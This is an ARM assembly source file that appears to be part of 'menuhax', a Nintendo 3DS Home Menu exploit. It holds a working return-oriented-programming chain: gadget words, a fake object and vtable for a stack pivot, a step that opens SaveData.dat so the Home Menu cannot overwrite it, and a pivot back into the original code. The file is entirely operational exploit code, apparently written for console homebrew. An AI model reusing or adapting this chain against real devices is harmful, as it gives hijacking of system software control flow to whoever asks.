.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

#if REGIONVAL!=4//non-KOR
#define SDICONHAX_SPRETADDR (0x0ffffe20 - (6*4)) //SP address right before the original stack-pivot was done.
#else//KOR
#define SDICONHAX_SPRETADDR (0x0ffffe18 - (6*4))
#endif

_start:

ropstackstart:

@ *(saved_r4+0x0) = <value setup by menuhax_manager>, aka the original address for the first objptr.
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word SDICONHAX_SPRETADDR

.word ROP_LDR_R0FROMR0

.word POP_R1PC
.word 0x0 @ r1

.word ROP_ADDR0_TO_R1 @ r0 = *srcaddr + value

.word POP_R1PC
.word (0x58414800 + 0x00)

.word ROP_STR_R1TOR0

@ *(saved_r4+0x4) = <value setup by menuhax_manager>, aka the original address for the second objptr.
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word SDICONHAX_SPRETADDR

.word ROP_LDR_R0FROMR0

.word POP_R1PC
.word 0x4 @ r1

.word ROP_ADDR0_TO_R1 @ r0 = *srcaddr + value

.word POP_R1PC
.word (0x58414800 + 0x01)

.word ROP_STR_R1TOR0

@ Subtract the saved r4 on stack by 4. This results in the current objptr in the target_objectslist_buffer being reprocessed @ RET2MENU.
ROPMACRO_LDDRR0_ADDR1_STRADDR SDICONHAX_SPRETADDR, SDICONHAX_SPRETADDR, 0xfffffffc

#include "menuhax_loader.s"

@ The ROP used for RET2MENU starts here.

@ Open the SaveData.dat extdata for reading without doing anything with it besides opening it. This blocks the actual Home Menu code from writing to SaveData.dat, since fsuser doesn't allow writing to files which are currently open for reading.
CALLFUNC_NOSP IFile_Open, (HEAPBUF + (savedatadat_filectx - _start)), (HEAPBUF + (savedatadat_filepath - _start)), 0x1, 0

ROPMACRO_STACKPIVOT SDICONHAX_SPRETADDR, POP_R4R8PC @ Return to executing the original homemenu code.

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word 0
.word 0
.word 0

.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word HEAPBUF + (ropstackstart - _start) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.

savedatadat_filectx:
.space 0x20

savedatadat_filepath:
.string16 "EXT:/SaveData.dat"
.align 2

